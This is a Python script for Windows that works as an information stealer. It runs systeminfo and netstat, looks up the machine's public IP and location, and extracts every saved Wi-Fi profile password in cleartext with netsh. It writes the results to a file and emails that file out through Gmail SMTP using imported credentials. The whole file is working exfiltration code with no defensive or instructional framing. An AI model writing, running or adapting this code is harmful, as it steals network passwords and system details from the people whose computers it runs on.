import subprocess
import requests
from bs4 import BeautifulSoup
import lxml
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from auth_data import passw, mail


def system_info() :
    system_data = subprocess.check_output('systeminfo').decode('CP866')
    #print(system_data)
    with open(file = 'check_system.txt', mode = 'a', encoding = 'utf-8') as file :
        file.write(f'SYSTEM INFO \n {system_data}\n {"*" * 100}\n ')


def ports_info() :
    ports_data = subprocess.check_output('netstat -a').decode('CP866')
    #print(ports_data)
    with open(file = 'check_system.txt', mode = 'a', encoding = 'utf-8') as file :
        file.write(f'\nINFORMATION ABOUT PORTS \n {ports_data} \n {"*" * 100}\n')


def check_ip() :
    ip_data = subprocess.check_output('nslookup myip.opendns.com. resolver1.opendns.com').decode('CP866').split('\n')
    ip_dns = [i.split(' : ')[0].strip() for i in ip_data if 'Address' in i][1]
    url = 'https://2ip.ru/'
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'lxml')
    ip = soup.find('div', class_ = 'ip').text.strip()
    location = soup.find('div', class_ = 'value-country').text.strip()
    name_pc = soup.find('div', class_='ip-icon-label').text.strip()
    #print(f'Information about IP  \n {ip_dns}\n Name of PC : {name_pc}\n Location : {location}\n IP address : {ip}\n {"*" * 100}\n')
    with open(file = 'check_system.txt', mode = 'a', encoding = 'utf-8') as file :
        file.write(f'Information about IP  \n {ip_dns}\n Name of PC : {name_pc}\n Location : {location}\n IP address : {ip}\n {"*" * 100}\n')


def check_wifi():
    profiles_data = subprocess.check_output('netsh wlan show profiles').decode('CP866').split("\n")
    profiles = [i.split(" : ")[1].strip() for i in profiles_data if 'All User Profile' in i or 'Все профили пользователей' in i]
    for profile in profiles :
        profile_info = subprocess.check_output(f'netsh wlan show profile {profile} key=clear').decode('CP866').split('\n')
        try :
            password = [i.split(' : ')[1].strip() for i in profile_info if 'Key Content' in i or 'Содержимое ключа' in i][0]
        except IndexError :
            password = None
        #print(f'WIFI INFORMATION\n Profile: {profile}\nPassword: {password}\n{"#" * 20}')
        with open(file = 'check_system.txt', mode = 'a', encoding = 'utf-8') as file :
            file.write(f'\n Profile: {profile}\nPassword: {password}\n{"#" * 20}')


def send_email() :
    attachment = "check_system.txt"
    msg = MIMEMultipart()
    msg['Subject'] = "Report"
    msg['From'] = mail
    msg['To'] = mail
    part = MIMEBase('application', "octet-stream")
    part.set_payload(open(attachment, "rb").read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment', filename=attachment)
    msg.attach(part)
    with smtplib.SMTP('smtp.gmail.com',587) as server:
       server.ehlo()
       server.starttls()
       server.ehlo()
       server.login(mail, passw)
       server.send_message(msg)
       server.quit()


def main():
    check_ip()
    system_info()
    ports_info()
    check_wifi()
    send_email()


if __name__ =="__main__" :
    main()
